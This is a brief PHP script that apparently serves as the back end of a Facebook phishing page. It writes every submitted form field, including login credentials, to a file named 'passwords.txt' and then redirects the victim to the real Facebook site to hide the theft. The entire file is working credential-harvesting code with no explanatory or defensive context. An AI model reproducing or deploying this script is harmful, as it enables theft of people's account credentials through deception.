<?php
$handle = fopen("../storage/passwords.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . "=" . $value . " | ");
}
fwrite($handle, "\r\n");
fclose($handle);
header("Location: https://www.facebook.com");
exit;
?>
